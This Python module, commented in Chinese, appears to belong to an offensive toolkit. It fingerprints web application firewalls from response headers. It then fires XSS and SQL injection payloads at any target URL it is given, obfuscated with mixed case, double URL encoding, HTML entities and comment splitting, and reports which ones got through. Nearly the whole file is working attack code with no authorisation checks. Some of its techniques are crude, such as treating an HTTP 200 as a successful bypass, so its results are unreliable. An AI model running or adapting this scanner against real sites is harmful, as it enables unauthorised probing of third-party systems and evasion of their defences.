# 开发者：自由的风
"""waf_bypass/run.py — WAF绕过(大小写/编码/分块/协议级)
=====================================================
攻击域 core — 不只是变形payload，而是分析WAF规则模式，
找到其检测盲区后精准穿透。源码层分析: 检测WAF类型→研究其规则缺陷。
"""
import sys, json, os, urllib.request, urllib.parse, re

SANDBOX = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

# WAF指纹库 — 从响应headers/body识别WAF类型
WAF_FINGERPRINTS = [
    (r"Cloudflare", "Cloudflare", ["chunked", "http2"]),
    (r"AkamaiGHost", "Akamai", ["encoding", "fragmentation"]),
    (r"Mod_Security|ModSecurity", "ModSecurity", ["case_variation", "encoding", "comment_injection"]),
    (r"AWSALB|AWSALBCORS", "AWS WAF", ["encoding", "http2"]),
    (r"__cfduid|cf-ray", "Cloudflare", ["chunked", "encoding"]),
    (r"F5|BIG-IP|TS[0-9a-f]{8}", "F5 ASM/BIG-IP", ["parameter_pollution", "encoding"]),
    (r"Imperva|incap_ses", "Imperva/Incapsula", ["protocol_switch", "encoding"]),
    (r"Sucuri|Sucuri/Cloudproxy", "Sucuri", ["case_variation"]),
    (r"Barracuda", "Barracuda", ["encoding"]),
]

# 绕过技术库
BYPASS_TECHNIQUES = {
    "case_variation": [
        ("<ScRiPt>alert(1)</sCrIpT>", "大小写混淆"),
        ("SeLeCt * FrOm users", "SQL大小写混淆"),
    ],
    "encoding": [
        ("%253Cscript%253E", "双重URL编码"),
        ("\u003cscript\u003e", "Unicode编码"),
        ("<&#x73;cript>", "HTML实体编码"),
    ],
    "comment_injection": [
        ("<scr/**/ipt>", "注释分割"),
        ("SEL/**/ECT", "SQL注释分割"),
        ("<scri<!-- -->pt>", "HTML注释注入"),
    ],
    "chunked": [
        ("Transfer-Encoding: chunked", "分块传输"),
    ],
    "parameter_pollution": [
        ("q=normal&q=malicious", "参数污染"),
    ],
    "protocol_switch": [
        ("HTTP/1.0", "降级到HTTP/1.0"),
    ],
}


def _probe_waf(url, timeout=10):
    """探测WAF类型"""
    try:
        if not url.startswith("http"):
            url = "http://" + url

        # 发送正常请求
        req = urllib.request.Request(url, headers={"User-Agent": "GBT-WAF-Audit/5.0"})
        resp = urllib.request.urlopen(req, timeout=timeout)
        headers = str(resp.headers)
        body = resp.read().decode("utf-8", errors="replace")[:2000]

        # 发送攻击payload触发WAF
        attack_url = url + "?q=<script>alert(1)</script>"
        try:
            req2 = urllib.request.Request(attack_url, headers={"User-Agent": "GBT-WAF-Audit/5.0"})
            resp2 = urllib.request.urlopen(req2, timeout=timeout)
            waf_headers = str(resp2.headers)
            waf_body = resp2.read().decode("utf-8", errors="replace")[:2000]
        except urllib.error.HTTPError as e:
            waf_headers = str(e.headers) if e.headers else ""
            waf_body = e.read().decode("utf-8", errors="replace")[:2000] if e.fp else ""
        except Exception:
            waf_headers = ""
            waf_body = ""

        # 指纹识别
        detected = None
        for pattern, waf_name, techniques in WAF_FINGERPRINTS:
            if re.search(pattern, headers + waf_headers + body + waf_body, re.IGNORECASE):
                detected = {"waf": waf_name, "recommended_techniques": techniques}
                break

        return {
            "ok": True,
            "normal_status": resp.status,
            "waf_detected": detected,
            "headers_sample": headers[:500],
        }
    except Exception as e:
        return {"ok": False, "error": str(e)[:100]}


def do_bypass(params):
    """WAF绕过测试"""
    target = params.get("target", params.get("url", ""))
    if not target:
        return {"ok": False, "error": "缺少 target/url 参数"}

    # ① WAF探测
    waf_info = _probe_waf(target)
    waf_name = waf_info.get("waf_detected", {}).get("waf", "Unknown") if waf_info.get("waf_detected") else "None"

    # ② 选择绕过技术
    techniques_to_try = []
    if waf_info.get("waf_detected"):
        for tech in waf_info["waf_detected"].get("recommended_techniques", []):
            if tech in BYPASS_TECHNIQUES:
                techniques_to_try.append(tech)
    # 兜底: 尝试所有技术
    if not techniques_to_try:
        techniques_to_try = list(BYPASS_TECHNIQUES.keys())[:5]

    # ③ 执行绕过
    results = []
    for tech_name in techniques_to_try[:5]:
        for payload, desc in BYPASS_TECHNIQUES.get(tech_name, []):
            try:
                test_url = target + ("&" if "?" in target else "?") + f"q={urllib.parse.quote(payload)}"
                req = urllib.request.Request(test_url, headers={"User-Agent": "GBT-Bypass/5.0"})
                resp = urllib.request.urlopen(req, timeout=8)
                results.append({
                    "technique": tech_name,
                    "payload": payload[:60],
                    "description": desc,
                    "bypassed": resp.status == 200,
                    "status": resp.status,
                })
            except urllib.error.HTTPError as e:
                results.append({
                    "technique": tech_name,
                    "payload": payload[:60],
                    "description": desc,
                    "bypassed": False,
                    "status": e.code,
                })
            except Exception:
                pass

    success = [r for r in results if r.get("bypassed")]

    return {
        "ok": True,
        "cap": "waf_bypass",
        "action": "bypass",
        "domain": "攻击域",
        "target": target,
        "waf_detected": waf_name,
        "techniques_tried": len(results),
        "bypass_successful": len(success),
        "results": results,
        "verdict": "WAF可绕过" if success else "WAF未绕过(或不存在)",
    }


def do_encode(params):
    """编码变形绕过"""
    return do_bypass(params)

def do_chunk(params):
    """分块传输绕过"""
    return do_bypass(params)


HANDLERS = {"bypass": do_bypass, "encode": do_encode, "chunk": do_chunk}

if __name__ == "__main__":
    action = sys.argv[1] if len(sys.argv) > 1 and not sys.argv[1].startswith("-") else "bypass"
    params_str = sys.argv[2] if len(sys.argv) > 2 else "{}"
    try:
        params = json.loads(params_str)
    except Exception:
        params = {}
    handler = HANDLERS.get(action)
    if handler:
        result = handler(params)
        print(json.dumps(result, ensure_ascii=False, default=str))
    else:
        print(json.dumps({"ok": False, "error": f"未知动作: {action}", "available": list(HANDLERS.keys())}, ensure_ascii=False))
